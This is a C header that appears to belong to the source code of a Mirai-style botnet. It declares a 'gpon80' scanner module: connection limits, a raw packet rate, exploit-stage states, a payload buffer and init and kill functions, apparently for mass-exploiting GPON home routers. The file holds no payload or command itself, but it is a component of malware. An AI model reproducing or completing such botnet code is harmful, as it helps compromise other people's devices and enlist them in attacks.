#pragma once
#ifdef NP_TELNET
#include <stdint.h>
#include "includes.h"

#define GPON80_SCANNER_MAX_CONNS 128
#define GPON80_SCANNER_RAW_PPS   160
#define GPON80_SCANNER_RDBUF_SIZE 256

struct gpon80_scanner_connection {
	int fd, last_recv;
	enum {
		GPON80_SC_CLOSED,
		GPON80_SC_CONNECTING,
		GPON80_SC_EXPLOIT_STAGE2,
		GPON80_SC_EXPLOIT_STAGE3,
	} state;
	ipv4_t dst_addr;
	uint16_t dst_port;
	int rdbuf_pos;
	char rdbuf[GPON80_SCANNER_RDBUF_SIZE];
	char payload_buf[512];
};

void gpon80_scanner_init(void);
void gpon80_scanner_kill(void);
#endif
